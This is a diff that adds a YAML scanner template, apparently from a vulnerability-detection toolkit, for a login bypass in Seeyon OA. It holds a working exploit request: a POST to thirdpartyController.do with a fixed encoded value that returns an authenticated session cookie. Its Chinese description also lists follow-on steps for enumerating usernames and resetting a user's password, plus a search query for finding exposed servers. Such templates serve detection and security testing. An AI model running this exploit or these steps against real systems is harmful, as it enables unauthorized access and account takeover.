@@ -1,0 +1,44 @@
+id: seeyon-thirdpartycontroller-login-bypass
+
+info:
+  name: Seeyon thirdpartyController.do 登录绕过
+  author: Print1n
+  severity: high
+  verified: true
+  description: |
+    致远 OA thirdpartyController.do 登录绕过，通过 POST 方法访问 /seeyon/thirdpartyController.do 接口，
+    并在请求体中传递 method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4 ，
+    即可绕过登录，获取 JSESSIONID  cookie 。继续利用：
+    1、访问 GET /seeyon/online.do?method=showOnlineUser
+    2、枚举用户名:
+    seeyon/rest/password/retrieve/send/{username}
+    /seeyon/rest/password/retrieve/getEmailByLoginName/{username}
+    /seeyon/personalBind.do?method=getBindTypeByLoginName&loginName={username}
+    3、重置密码为share.do
+    PUT /seeyon/rest/orgMember/-7273032013234748168/password/share.do
+    fofa: app="Seeyon-A8"
+  reference:
+    - https://mp.weixin.qq.com/s/0AqdfTrZUVrwTMbKEKresg
+  tags: seeyon,disclosure
+  created: 2023/10/29
+  requires: [seeyon]
+  requires-mode: opportunistic
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /seeyon/thirdpartyController.do
+      body: method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
+    expression: response.status == 200 && "JSESSIONID=(.*)".bmatches(response.raw_header)
+    output:
+      search: '"JSESSIONID=(?P<mycookie>.*?);".bsubmatch(response.raw_header)'
+      mycookie: search["mycookie"]
+  r1:
+    request:
+      method: GET
+      path: /seeyon/main.do
+      headers:
+        Cookie: "JSESSIONID={{mycookie}}"
+    expression: response.status == 200 && response.body.bcontains(b"<a href='/seeyon/main.do?method=logout'")
+expression: r0() && r1()
